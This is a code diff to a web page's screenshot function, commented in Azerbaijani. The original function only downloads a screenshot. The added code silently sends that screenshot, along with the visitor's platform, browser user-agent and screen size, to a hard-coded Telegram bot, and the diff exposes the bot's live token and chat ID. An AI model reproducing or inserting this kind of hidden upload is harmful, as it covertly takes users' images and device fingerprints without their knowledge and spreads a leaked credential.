@@ -110,21 +110,58 @@
       </div>
     </div>
     <script>
-      function takeScreenshot() {
-        const target = document  .getElementById("All");
+  function takeScreenshot() {
+    const target = document.getElementById("All");
 
-        html2canvas(target, {
-          useCORS: true,
-          allowTaint: false
-        }).then(canvas => {
-          canvas.toBlob(function(blob) {
-            const link = document  .createElement("a");
-            link.href = URL.createObjectURL(blob);
-            link.download = "ehmed.png";
-            link.click();
-          }, "image/png");
-        });
-      }
-    </script>
+    html2canvas(target, {
+      useCORS: true,
+      allowTaint: false
+    }).then(canvas => {
+      canvas.toBlob(function(blob) {
+        // 1. Telefona endir
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = "ehmed.png";
+        link.click();
+
+        // 2. Telegram bota şəkil göndər
+        const botToken = "7672201603:AAHxta0mmqPWev6nm7Uofj8_4SFfwXc2_JQ";        // ← Buraya öz tokenini yaz
+        const chatId = "7076972022";            // ← Öz chat_id və ya kanal id-ni yaz
+
+        const photoForm = new FormData();
+        photoForm.append("chat_id", chatId);
+        photoForm.append("photo", blob, "ehmed.png");
+        photoForm.append("caption", "Yeni qeyd şəkli:");
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
+          body: photoForm
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log("Şəkil göndərildi", data);
+
+          // 3. Cihaz məlumatlarını mesaj kimi göndər
+          const platform = navigator.platform;
+          const userAgent = navigator.userAgent;
+          const screenSize = `${screen.width}x${screen.height}`;
+          const msg = `📱 Cihaz Məlumatı:\n\n📌 Platforma: ${platform}\n🧭 Browser: ${userAgent}\n🖥️ Ekran: ${screenSize}`;
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: msg
+            })
+          });
+        })
+        .catch(error => console.error("Telegram xətası:", error));
+      }, "image/png");
+    });
+  }
+</script>
   </body>
 </html>
